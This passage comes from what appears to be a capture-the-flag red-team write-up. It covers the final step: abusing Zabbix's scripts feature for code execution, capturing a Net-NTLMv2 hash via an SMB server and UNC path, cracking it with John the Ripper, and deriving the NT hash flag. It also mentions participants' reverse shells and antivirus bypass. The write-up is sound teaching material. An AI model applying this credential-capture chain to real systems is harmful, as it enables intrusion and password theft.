+<p>Once connected we can navigate to the <code class="language-plaintext highlighter-rouge">Administration</code> section and use the <code class="language-plaintext highlighter-rouge">scripts</code> feature to perform remote code execution on the agents. By executing a simple <code class="language-plaintext highlighter-rouge">whoami</code> command, we can identify that the agent runs with <code class="language-plaintext highlighter-rouge">phealthycat\jldelafont</code> (our target) privileges.
+A first thing that we can try, is to make the agent connect to a SMB server that we host through UNC path to capture the Net-NTLMv2 of our target. It can be done by using <code class="language-plaintext highlighter-rouge">smbserver.py</code> from the <code class="language-plaintext highlighter-rouge">impacket</code> tools. A lot of challengers used <code class="language-plaintext highlighter-rouge">Responder</code> for its SMB server part, but it is not its primary function. That’s why <code class="language-plaintext highlighter-rouge">smbserver.py</code> from impacket is more appropriated.</p>
+
+<p><img src="/assets/redteam/script.png" alt="script" /> 
+To execute our script, we need to manually execute it on our agent through the <code class="language-plaintext highlighter-rouge">Last data</code> page of the Zabbix server.</p>
+
+<p><img src="/assets/redteam/launch_script.png" alt="execute script" /></p>
+
+<p>Once our script executed, we can see on our impacket server the Net-NTLMv2 of our target.</p>
+
+<p><img src="/assets/redteam/impacket.png" alt="Impacket" />
+<img src="/assets/redteam/netntlmv2.png" alt="Net-NTLMv2" /></p>
+
+<p>With this Net-NTLMv2, we can attempt to crack it with <code class="language-plaintext highlighter-rouge">John-The-Ripper</code> and the famous wordlist <code class="language-plaintext highlighter-rouge">Rock-You</code>.</p>
+
+<p><img src="/assets/redteam/john.png" alt="John" /></p>
+
+<p>We can easily discover our target’s password in plain text: <code class="language-plaintext highlighter-rouge">Blink182</code>.
+Now that we have the plain text password, we can reforge the NT hash which is only our plain text password encoded in <code class="language-plaintext highlighter-rouge">UTF-16-LE</code> and hashed in MD4 (without the newline).</p>
+
+<p><img src="/assets/redteam/NT.png" alt="Hash NT" /></p>
+
+<p>We now have our last flag: <code class="language-plaintext highlighter-rouge">ECW{c2367169e3279fa3e85d9d25f0e85e45}</code></p>
+
+<h4 id="fun-fact-omg-windef">Fun Fact: OMG WinDef</h4>
+
+<p>A lot of challengers wanted to launch a meterpreter or a reverse shell on the machine. However <code class="language-plaintext highlighter-rouge">Windows Defender</code> was running on the machine.</p>
+
+<p>I got a some DM about bypassing the antivirus. They tried some obscure russian things…</p>
+
+<blockquote>
+  <p><img src="/assets/redteam/russian.png" alt="Russian" /></p>
+</blockquote>
+
+<p>Once they finnally succeed to deploy a meterpreter or a reverse shell on the machine and flag the last step, I happily told them that bypassing Windows Defender was not necessary to flag the last step.</p>
+
+<blockquote>
+  <p><img src="/assets/redteam/upset.png" alt="upset" /></p>
+</blockquote>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This year we aimed to create a BIG challenge summarizing our most typical penetration testing mission</p>
+
+<p>We hope you liked it and had as much fun playing it than we had creating it :)</p>
+:ET
